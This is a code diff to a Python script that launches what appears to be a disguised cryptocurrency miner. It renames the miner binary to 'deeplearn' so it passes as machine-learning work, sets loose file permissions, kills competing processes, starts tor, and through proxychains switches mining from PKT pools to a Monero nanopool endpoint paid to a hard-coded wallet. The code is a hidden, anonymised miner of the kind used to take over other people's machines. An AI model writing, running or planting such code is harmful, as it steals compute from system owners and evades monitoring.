@@ -5,7 +5,7 @@ import multiprocessing
 
 useproxy = 0
 os.system('chmod 777 ' + __file__)
-program = 'learning'
+program = 'deeplearn'
 os.system('pkill ' + program)
 cores = multiprocessing.cpu_count() - 1
 if cores <= 0:
@@ -32,4 +32,5 @@ except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' ann -p pkt1qmmecdztm2ff4fvul0y2u7nfrrh3pdy0x6p6vdk http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com ' )
+#os.system ('proxychains4 ' + program + ' ann -p pkt1qmmecdztm2ff4fvul0y2u7nfrrh3pdy0x6p6vdk http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com ' )
+os.system ('proxychains4 ' + program + ' --algo null --url xmr-eu1.nanopool.org:14433 --user 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY.ml -p xm --ssl 1 ' )
